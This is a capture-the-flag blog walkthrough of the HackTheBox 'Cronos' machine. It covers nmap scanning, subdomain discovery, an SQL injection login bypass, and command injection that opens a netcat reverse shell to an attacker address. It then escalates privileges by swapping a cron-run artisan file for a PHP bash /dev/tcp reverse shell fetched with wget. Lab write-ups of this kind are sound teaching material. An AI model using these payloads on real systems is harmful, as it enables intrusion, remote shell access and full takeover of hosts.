+++
title = "HackTheBox - Cronos"
description = ""
type = ["posts","post"]
tags = [
    "HackTheBox",
    "CTF",
    "Bug",
]
date = "2020-07-14"
categories = [
    "HackTheBox",
    "CTF",
]
series = ["HackTheBox"]
[ author ]
  name = "0xSc0ut"
+++

Welcome back with another HackTheBox machine


![](https://paper-attachments.dropbox.com/s_30DCA98E8989B7D81FD7F79DEB0D1DB11230410502617F324E805C513302A199_1594878011254_Screenshot+2020-07-16+at+11.09.53+AM.png)


Cronos is a **Linux** based **Medium** severity machine. This machine is highly recommended for beginners. Initial shell requires basic web application tricks whereas post exploitation is also something which we have seen before.

**Tools:**


- PortScan - Masscan and Nmap
- Subdomain Enumeration - Dig

**Initial Recon:**

As always start with scanning all ports, I have used masscan and nmap.


    #masscan
    open tcp 80 10.10.10.13 1594390115
    open tcp 53 10.10.10.13 1594390124
    open udp 53 10.10.10.13 1594390129
    open tcp 22 10.10.10.13 1594390142

**Nmap:**


    PORT   STATE  SERVICE VERSION
    22/tcp open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
    |   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
    |_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
    53/tcp open   domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
    80/tcp open   http    Apache httpd 2.4.18 ((Ubuntu))                                                                                                                                                         
    | http-cookie-flags:                                                                                                                                                                                         
    |   /:                                                                                                                                                                                                       
    |     PHPSESSID:                                                                                                                                                                                             
    |_      httponly flag not set                                                                                                                                                                                
    |_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                                                                                 
    |_http-title: Login Page                                                                                                                                                                                     
    | vulners:                                                                                                                                                                                                   
    |   cpe:/a:apache:http_server:2.4.18:                                                                                                                                                                        
    |       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679                                                                                                                                        
    |       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668                                                                                                                                        
    |       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169                                                                                                                                        
    |       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167                                                                                                                                        
    |       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211                                                                                                                                        
    |       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312                                                                                                                                        
    |       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715                                                                                                                                       
    |       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082                                                                                                                                       
    |       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
    |       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
    |       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
    |       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
    |       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
    |       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
    |       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
    |       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
    |       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
    |       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
    |       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
    |       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
    |       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740
    |       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979
    |       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
    |       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
    |       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
    |       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
    |       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546
    |       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
    |_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
    22/udp closed ssh
    53/udp open   domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
    | dns-nsid: 
    |_  bind.version: 9.10.3-P4-Ubuntu
    80/udp closed http
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Linux 3.16 (94%), Linux 3.2 - 4.9 (94%), Linux 4.2 (94%), Linux 3.10 - 4.11 (93%), Linux 3.12 (93%), Linux 3.13 (93%), Linux 3.13 or 4.2 (93%), Linux 3.16 - 4.6 (93%), Linux 3.18 (93%), Linux 3.8 - 3.11 (93%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    TRACEROUTE (using proto 1/icmp)
    HOP RTT       ADDRESS
    1   560.94 ms 10.10.14.1
    2   543.36 ms admin.cronos.htb (10.10.10.13)
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 62.65 seconds
    

Accessing cronos.htb we result in something like this


![](https://paper-attachments.dropbox.com/s_30DCA98E8989B7D81FD7F79DEB0D1DB11230410502617F324E805C513302A199_1594881469139_Screenshot+2020-07-16+at+12.06.48+PM.png)


 
You will get subdomain **admin.cronos.htb** , only when you configure ip address and domain in **/etc/hosts**

Another way to find subdomains is using dig command (DNS Zone transfer misconfiguration ) [Reference](https://hackertarget.com/zone-transfer/)

**Initial Shell as www-data:**

By accessing admin.cronos.htb, a login pages was there


![](https://paper-attachments.dropbox.com/s_30DCA98E8989B7D81FD7F79DEB0D1DB11230410502617F324E805C513302A199_1594879944308_Screenshot+2020-07-16+at+11.41.57+AM.png)


I tried using common password which actually didn’t work, but found basic SQLi which allowed me in


    username: ‘ or 1=1#
    password: ‘ or 1=1#

So there is something where we can execute our shell commands


![](https://paper-attachments.dropbox.com/s_30DCA98E8989B7D81FD7F79DEB0D1DB11230410502617F324E805C513302A199_1594880129024_Screenshot+2020-07-16+at+11.44.45+AM.png)


If you are one who have played [DVWA](http://www.dvwa.co.uk/) (Damn Vulnerable Web Application), then this won’t be a big deal for,


    127.0.0.1 && ls


![](https://paper-attachments.dropbox.com/s_30DCA98E8989B7D81FD7F79DEB0D1DB11230410502617F324E805C513302A199_1594880448697_Screenshot+2020-07-16+at+11.50.39+AM.png)



    127.0.0.1 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.x.x 1234 >/tmp/f


![](https://paper-attachments.dropbox.com/s_30DCA98E8989B7D81FD7F79DEB0D1DB11230410502617F324E805C513302A199_1594880601810_Screenshot+2020-07-16+at+11.53.13+AM.png)


Use below command to read user flag


    cat /home/noulis/user.txt

**Privilege Escalation:**

While running crontab found a intresting crontab activity which runs every minute


![](https://paper-attachments.dropbox.com/s_30DCA98E8989B7D81FD7F79DEB0D1DB11230410502617F324E805C513302A199_1594886147602_Screenshot+2020-07-16+at+1.25.06+PM.png)


Lets backup the file content so we can retrive it if something goes wrong


    mv artisan artisan.bak


![](https://paper-attachments.dropbox.com/s_30DCA98E8989B7D81FD7F79DEB0D1DB11230410502617F324E805C513302A199_1594885217965_Screenshot+2020-07-16+at+1.10.03+PM.png)



So i created a php reverse shell file in my local machine


    <?php
    exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.x.x/1234 0>&1'");
    ?>

Transfer the file to vulnerable machine using command


    In my machine
    python -m SimpleHTTPServer <portnumber>


    In Victim machine
    wget http://10.10.x.x:<portnumber>/filename

I have used this you can use any file transfer technique

Now lets delete file **artisan** and change our file name as artisan


    rm artisan
    mv shell.php artisan

Since this file executes for every minute, we can start a netcat listner in our machine 

BOOM!!


![](https://paper-attachments.dropbox.com/s_30DCA98E8989B7D81FD7F79DEB0D1DB11230410502617F324E805C513302A199_1594885450090_Screenshot+2020-07-16+at+1.13.58+PM.png)


Thank you !! Will see you again in my next post

